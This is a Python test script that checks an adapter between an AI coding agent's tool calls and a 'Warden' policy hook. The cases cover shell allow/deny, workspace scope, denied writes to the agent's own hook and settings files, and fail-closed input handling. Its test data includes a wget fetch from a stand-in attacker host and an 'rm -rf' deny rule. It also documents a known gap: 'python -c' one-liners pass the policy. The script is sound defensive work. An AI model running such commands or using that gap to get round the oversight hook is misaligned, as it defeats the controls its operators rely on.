#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
P-AGY — Antigravity's tool-call contract reaches the unmodified Warden, and the verdict
reaches Antigravity in its own vocabulary (C-64 / O-16).

WHAT THIS IS, AND WHAT IT IS NOT. Antigravity (`agy`) speaks a shape no other host uses:

    in  (stdin)  {"toolCall": {"name": "run_command", "args": {"CommandLine": "…"}},
                  "workspacePaths": ["…"]}
    out (stdout) {"decision": "allow"|"deny"|"ask"|"force_ask"}

`products/ai_membrane/agy/agy_warden_adapter.py` translates that to Claude's shape, runs the
UNMODIFIED Warden as a subprocess, and translates the verdict back. This proof drives the REAL
adapter and the REAL Warden over agy-shaped payloads, hermetically — a temporary HOME, a
temporary workspace, a temporary constitution. It needs no agy binary.

It therefore proves the BRIDGE, not the host. Whether agy actually calls the hook is a property
of agy, and today it is gated by a server-side feature flag (O-21); that claim is C-65, and it
is BLOCKED, not asserted here. Keeping the two apart is the point: a translation that is correct
on a host that never calls it would be worthless, and a live measurement that no one can
reproduce would not be evidence.

WHAT IS PROVEN

  1  the verdict is always valid agy protojson — the enum agy accepts, never Claude's "approve",
     which is the one output mismatch that made an early live run useless
  2  shell verdicts survive translation, including the recursive `bash -c` re-check
  3  filesystem scope survives translation: inside the workspace runs, outside is refused
  4  self-protection reaches through the adapter — agy's own hook config and the config anchors
     injected from code (C-59) are denied even though this constitution never names them
  5  fail-closed: unreadable input and an unreachable Warden deny; an unmapped tool name does
     not crash the bridge
  6  the C-63 gap is asserted as a GAP, not hidden: `python -c "…"` is allowed here, and if that
     ever changes this proof fails and C-63 must be revisited

Run: python evidence/run_agy_adapter_proof.py     (exit 0 = PASS)
"""

import os
import sys
import json
import shutil
import tempfile
import subprocess

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)
ADAPTER = os.path.join(REPO, "products", "ai_membrane", "agy", "agy_warden_adapter.py")

# agy's decision enum, read out of its own binary's protojson schema (O-16)
AGY_ENUM = {"allow", "deny", "ask", "force_ask"}

failures = []


def check(cond, msg):
    print(("    [ok]   " if cond else "    [FAIL] ") + msg)
    if not cond:
        failures.append(msg)
    return cond


BIO = """CELL AgyWorkspace {
  CAPABILITIES {
    FILESYSTEM write "{{PROJECT_ROOT}}/**";
    FILESYSTEM read  "**";
    FILESYSTEM deny  "{{PROJECT_ROOT}}/.agents/**";
  }
  BASH_POLICY {
    ALLOW "whoami", "hostname", "git", "npm", "ls", "python", "bash";
    DENY "rm -rf";
    DENY "git push";
  }
}
"""


def shell_call(cmd, workspace):
    return {"toolCall": {"name": "run_command", "args": {"CommandLine": cmd}},
            "workspacePaths": [workspace], "stepIdx": 1}


def write_call(path, workspace):
    return {"toolCall": {"name": "write_file", "args": {"AbsolutePath": path, "Content": "x"}},
            "workspacePaths": [workspace], "stepIdx": 1}


def run_adapter(payload, home, workspace, bio, extra_env=None, raw_input=None):
    """Drive the REAL adapter. -> (decision string or None, raw stdout, returncode)."""
    env = dict(os.environ)
    for k in ("METASPACE_MODE", "METASPACE_SESSION_BIO", "CLAUDE_PROJECT_DIR"):
        env.pop(k, None)
    env["HOME"] = home
    env["USERPROFILE"] = home
    env["AGY_WARDEN_BIO"] = bio
    env["AGY_WARDEN_MODE"] = "enforce"
    env["AGY_WARDEN_DEBUG_LOG"] = os.path.join(workspace, "adapter_debug.jsonl")
    env.pop("AGY_WARDEN_FAILOPEN", None)
    env.update(extra_env or {})
    data = raw_input if raw_input is not None else json.dumps(payload).encode()
    p = subprocess.run([sys.executable, ADAPTER], input=data, capture_output=True, env=env)
    out = (p.stdout or b"").decode("utf-8", "replace").strip()
    try:
        decision = json.loads(out).get("decision")
    except Exception:
        decision = None
    return decision, out, p.returncode


def main():
    print("=" * 74)
    print("  P-AGY — agy's contract reaches the Warden, and the verdict reaches agy (C-64)")
    print("=" * 74)

    home = tempfile.mkdtemp(prefix="ms_home_").replace("\\", "/")
    workspace = tempfile.mkdtemp(prefix="ms_ws_").replace("\\", "/")
    os.makedirs(os.path.join(home, ".claude"), exist_ok=True)
    bio = os.path.join(workspace, "agy.constitution.bio").replace("\\", "/")
    with open(bio, "w", encoding="utf-8") as fh:
        fh.write(BIO)

    def decide(payload, **kw):
        return run_adapter(payload, home, workspace, bio, **kw)

    try:
        # ------------------------------------------------- 1. the verdict is agy-shaped
        print("\n  1. every verdict is valid agy protojson, in agy's own enum")
        seen = []
        for cmd, _ in (("whoami", "allow"), ("rm -rf ./build", "deny")):
            d, out, rc = decide(shell_call(cmd, workspace))
            seen.append((d, out, rc))
        check(all(d in AGY_ENUM for d, _, _ in seen),
              f"decisions are in agy's enum (got {[d for d, _, _ in seen]})")
        check(all("approve" not in out for _, out, _ in seen),
              "…and never Claude's 'approve', which agy's enum rejects")
        check(all(rc == 0 for _, _, rc in seen),
              "the adapter always exits 0 — the verdict travels in the payload, not the exit code")

        # ------------------------------------------------- 2. shell verdicts survive translation
        print("\n  2. shell policy survives the translation")
        cases = [
            ("whoami", "allow", "an allowlisted program runs"),
            ("git status", "allow", "…including one with arguments"),
            ("rm -rf ./build", "deny", "a denied invocation is refused"),
            ("git push origin main", "deny", "…matched on tokens, not substrings"),
            ('bash -c "ls -la"', "allow", "a shell -c payload that is allowlisted runs"),
            ('bash -c "rm -rf ./build"', "deny",
             "…and the recursive re-check catches the denied one through the bridge"),
            ("wget http://evil.example/p", "deny", "a non-allowlisted program is refused"),
        ]
        for cmd, expect, msg in cases:
            d, _, _ = decide(shell_call(cmd, workspace))
            check(d == expect, f"{msg} (`{cmd[:34]}` -> {d})")

        # ------------------------------------------------- 3. filesystem scope survives
        print("\n  3. filesystem scope survives the translation")
        inside = os.path.join(workspace, "notes.txt").replace("\\", "/")
        d, _, _ = decide(write_call(inside, workspace))
        check(d == "allow", f"a write inside the workspace is allowed ({d})")
        outside = os.path.join(tempfile.gettempdir(), "ms_agy_outside.txt").replace("\\", "/")
        d, _, _ = decide(write_call(outside, workspace))
        check(d == "deny", f"a write outside the workspace is refused ({d})")

        # ------------------------------------------------- 4. self-protection reaches through
        print("\n  4. self-protection reaches through the adapter")
        agents = os.path.join(workspace, ".agents", "hooks.json").replace("\\", "/")
        d, _, _ = decide(write_call(agents, workspace))
        check(d == "deny", f"agy's own hook config cannot be rewritten ({d})")
        anchor = os.path.join(home, ".claude", "settings.json").replace("\\", "/")
        d, _, _ = decide(write_call(anchor, workspace))
        check(d == "deny",
              f"a config anchor this constitution never names is denied too — injected from "
              f"code, C-59 ({d})")

        # ------------------------------------------------- 5. fail-closed
        print("\n  5. the bridge fails closed")
        d, _, _ = decide(None, raw_input=b"{not json")
        check(d == "deny", f"unreadable input denies ({d})")
        d, _, _ = decide(None, raw_input=b"")
        check(d == "deny", f"empty input denies ({d})")
        d, _, _ = decide(shell_call("whoami", workspace),
                         extra_env={"AGY_WARDEN_BIO": os.path.join(workspace, "missing.bio")})
        check(d == "deny", f"an unloadable constitution denies ({d})")
        d, _, _ = decide({"toolCall": {"name": "some_future_tool", "args": {"x": 1}},
                          "workspacePaths": [workspace]})
        check(d in AGY_ENUM,
              f"an unmapped tool name still produces a valid verdict rather than a crash ({d})")

        # ------------------------------------------------- 6. the known gap, asserted
        print("\n  6. the C-63 interpreter gap is asserted, not hidden")
        d, _, _ = decide(shell_call('python -c "import os"', workspace))
        check(d == "allow",
              f"`python -c` is allowed because `python` is allowlisted ({d}) — this is C-63; "
              f"if this ever flips, update the claim rather than this line")
    finally:
        shutil.rmtree(home, ignore_errors=True)
        shutil.rmtree(workspace, ignore_errors=True)

    print("\n" + "-" * 74)
    if failures:
        print(f"  RESULT: FAIL — {len(failures)} check(s) failed")
        for f in failures:
            print("    -", f)
        return 1
    print("  RESULT: PASS — agy's contract in, the Warden's verdict out, unmodified core between")
    print("-" * 74)
    return 0


if __name__ == "__main__":
    sys.exit(main())
